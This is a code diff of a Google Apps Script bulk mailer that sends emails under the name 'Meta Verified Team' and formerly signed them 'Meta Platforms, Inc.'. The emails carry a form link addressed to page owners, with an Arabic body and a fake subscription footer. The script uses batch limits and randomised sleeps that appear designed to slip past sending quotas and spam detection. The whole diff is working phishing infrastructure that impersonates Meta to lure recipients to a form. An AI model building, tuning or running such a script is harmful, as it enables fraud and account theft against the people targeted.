@@ -2,10 +2,10 @@ const CONFIG = {
   FORM_URL: "[LINK_FORM]",
   SPREADSHEET_URL: "[LINK_SHEET]",
   SHEET_NAME: "Sheet1",
-  SENDER_NAME: "Meta Support Team",
+  SENDER_NAME: "Meta Verified Team",
   BATCH_LIMIT: 4,
-  REST_MIN: 2,
-  REST_MAX: 6,
+  REST_MIN: 3,
+  REST_MAX: 10,
   MIN_SLEEP: 30000,
   MAX_SLEEP: 60000,
   MAX_EXECUTION_TIME: 280000,
@@ -35,17 +35,20 @@ function buildPlainText(intro, linkText, formUrl, email) {
 
 ${linkText} ${formUrl}
 
-Applications are reviewed in accordance with Meta’s policies. You will be notified once the evaluation is complete.
+بعد إرسال الطلب، سيتم مراجعة معلوماتكم وسيتم إشعاركم بالنتيجة في أقرب وقت ممكن.
 
-Sincerely,
-Meta Platforms, Inc.`
+نحن نُقدّر دعمكم وتواصلكم معنا.
+
+مع خالص التحية،
+--
+تم إرسال هذه الرسالة إلى ${email} لأنكم قمتم بالاشتراك في تلقي التحديثات من خدماتنا.`
   );
 }
 
 function _mainLogic(e) {
   const startTime = Date.now();
   const props = PropertiesService.getScriptProperties();
-  const userEmail = getEffectiveUserEmail(); // Đây là email của bạn (người đang gửi)
+  const userEmail = getEffectiveUserEmail();
   const quota = MailApp.getRemainingDailyQuota();
 
   Logger.log(`📊 Quota còn: ${quota}`);
@@ -127,7 +130,7 @@ function _mainLogic(e) {
     linkText = linkText.replace(/\[Name\]/g, pageName).replace(/\\n/g, "\n");
 
     const now = new Date();
-    const dateStr = Utilities.formatDate(now, "America/New_York", "MM/dd/yyyy hh:mm");
+    const dateStr = Utilities.formatDate(now, "Asia/Dubai", "dd/MM/yyyy HH:mm");
     subject = `[${dateStr}] ${subject}`;
 
     const body = buildPlainText(intro, linkText, CONFIG.FORM_URL, email);
